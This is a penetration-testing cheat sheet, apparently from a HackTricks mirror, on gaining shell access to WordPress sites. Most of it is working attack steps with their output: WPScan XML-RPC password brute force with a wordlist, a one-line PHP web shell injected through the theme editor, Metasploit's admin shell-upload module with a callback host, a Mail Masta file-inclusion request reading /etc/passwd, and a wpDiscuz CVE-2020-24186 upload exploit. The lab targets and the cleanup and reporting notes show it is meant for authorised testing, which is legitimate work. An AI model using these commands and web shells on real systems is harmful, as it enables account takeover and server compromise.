https://hacktricks.boitatech.com.br/pentesting/pentesting-web/wordpress
## WordPress – Attacking
### Objective

Gain code execution and shell access through:

1. Login bruteforce    
2. Abuse of theme editor
3. Metasploit exploitation
4. Plugin vulnerabilities (Mail Masta, wpDiscuz)
### 1. Login Bruteforce (WPScan)

#### Command Syntax:

```bash
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://<target>
```

#### Key Flags:

- `--password-attack xmlrpc` – uses `/xmlrpc.php` API for faster bruteforce    
- `-U` – single user or file with usernames
- `-P` – password wordlist
- `-t` – number of threads
#### Example Output:

```
[SUCCESS] - john / firebird1
```
### 2. Code Execution via Theme Editor (Manual)

#### Prerequisites:

- Admin panel access (e.g., `john:firebird1`)    
#### Steps:

1. Log into `/wp-login.php`    
2. Navigate to `Appearance > Theme Editor`
3. Switch to an inactive theme (e.g., Twenty Nineteen)
4. Choose `404.php` or similar unused file
5. Inject payload:

```php
system($_GET[0]);
```

6. Save file    
#### Test Webshell:

```bash
curl http://<target>/wp-content/themes/twentynineteen/404.php?0=id
```

#### Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
### 3. Code Execution via Metasploit (Automatic)

#### Module:

```
exploit/unix/webapp/wp_admin_shell_upload
```
#### Configuration:

```bash
set USERNAME john
set PASSWORD firebird1
set LHOST 10.10.14.15
set RHOST 10.129.42.195
set VHOST blog.inlanefreight.local
```
#### Run:

```bash
exploit
```
#### Example Output:

```
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: www-data (33)
```
#### Cleanup:

- Metasploit tries deleting files:    
    - `/wp-content/plugins/<random>/payload.php`
- Always list artifacts in your report appendix.
### 4. Exploiting Vulnerable Plugins

#### Plugin Vulnerability Stats (WPScan DB):

- 89% Plugins    
- 7% Themes
- 4% WordPress Core
### 4.1 Mail Masta – LFI + SQLi

#### Vulnerable Code:

```php
include($_GET['pl']);  // No sanitization
```
#### Exploit:

```bash
curl -s http://<target>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
#### Output:

```
root:x:0:0:root:/root:/bin/bash
...
```
### 4.2 wpDiscuz 7.0.4 – RCE (CVE-2020-24186)

#### Vulnerability:

- File upload bypass: PHP file accepted as image via MIME tricks    
- Results in unauthenticated RCE
#### Exploit Script:

```bash
python3 wp_discuz.py -u http://<target> -p /?p=1
```
#### Upload Output:

```
Generated webshell name: uthsdkbywoxeebg
Upload Success: /wp-content/uploads/2021/08/uthsdkbywoxeebg-<random>.php
```
#### Execute Command via Webshell:

```bash
curl -s http://<target>/wp-content/uploads/2021/08/uthsdkbywoxeebg-<random>.php?cmd=id
```
#### Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
#### Note:

- Cleanup webshell post-exploit. 
- Log artifact and path in your report.
### Bonus Tactic – Wayback Machine Recon

- Use `waybackurls` to find outdated plugin paths:    

```bash
waybackurls blog.inlanefreight.local | grep wp-content
```

- Look for outdated/leftover plugin folders
### Summary

|Exploit Path|Details|
|---|---|
|Login Bruteforce|XML-RPC bruteforce with WPScan|
|Manual RCE|Via theme editor and inactive theme (e.g., 404.php)|
|Auto Shell Upload|Metasploit’s `wp_admin_shell_upload` with credentials|
|Mail Masta Exploit|LFI via unsanitized `include($_GET['pl'])`|
|wpDiscuz Exploit|File upload bypass to RCE (CVE-2020-24186)|
|Artifact Handling|Cleanup all shells, report artifacts (name, path, method)|
# Tags
> #Exploitation #Application-Exploitation #Wordpress